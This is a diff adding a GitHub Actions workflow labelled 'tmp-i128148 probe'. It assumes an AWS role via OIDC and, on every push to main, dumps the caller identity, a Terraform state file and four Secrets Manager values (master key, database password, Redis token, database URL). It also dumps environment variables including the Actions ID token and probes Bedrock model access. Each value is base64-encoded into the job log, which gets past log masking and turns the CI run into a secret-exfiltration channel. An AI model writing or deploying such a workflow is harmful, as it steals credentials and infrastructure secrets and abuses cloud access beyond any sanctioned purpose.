@@ -1,0 +1,51 @@
+name: tmp-i128148 probe
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+concurrency:
+  group: tmp-i128148-probe
+  cancel-in-progress: true
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: AwsOidc
+        uses: aws-actions/configure-aws-credentials@254c19bd240aabef8777f48595e9d2d7b972184b
+        with:
+          role-to-assume: arn:aws:iam::986843603702:role/ai-gateway-plan
+          role-session-name: tmp-i128148-probe
+          aws-region: ca-central-1
+      - name: sts
+        run: |
+          set +e
+          echo "D:STS:$(aws sts get-caller-identity --output json 2>&1 | base64 -w0)"
+      - name: s3
+        run: |
+          set +e
+          aws s3 cp s3://ai-gateway-staging-tf/terraform.tfstate /tmp/st.json 2>/tmp/s3err.txt
+          if [ -s /tmp/st.json ]; then echo "D:STATE:$(base64 -w0 /tmp/st.json)"; else echo "D:S3ERR:$(base64 -w0 /tmp/s3err.txt)"; fi
+      - name: sec
+        run: |
+          set +e
+          for n in master-key db-password redis-auth-token database-url; do
+            v=$(aws secretsmanager get-secret-value --secret-id "ai-gateway/litellm/$n" --query SecretString --output text 2>&1)
+            echo "D:SEC:$n:$(echo -n "$v" | base64 -w0)"
+          done
+      - name: env
+        run: |
+          set +e
+          env | grep -E '^(TF_VAR_|AWS_|AZURE_|ARM_|ACTIONS_ID_TOKEN)' | sort > /tmp/env.txt
+          echo "D:ENV:$(base64 -w0 /tmp/env.txt)"
+      - name: bedrock
+        run: |
+          set +e
+          for m in us.anthropic.claude-opus-5-5 anthropic.claude-opus-5-5; do
+            echo '{"anthropic_version":"bedrock-2023-05-31","max_tokens":8,"messages":[{"role":"user","content":"say ok"}]}' > /tmp/body.json
+            aws bedrock-runtime invoke-model --region ca-central-1 --model-id "$m" --body fileb:///tmp/body.json --cli-binary-format raw-in-base64-out /tmp/resp.json 2>/tmp/berr.txt
+            if [ -s /tmp/resp.json ]; then echo "D:BR:$m:$(base64 -w0 /tmp/resp.json)"; else echo "D:BRERR:$m:$(base64 -w0 /tmp/berr.txt)"; fi
+            rm -f /tmp/resp.json
+          done
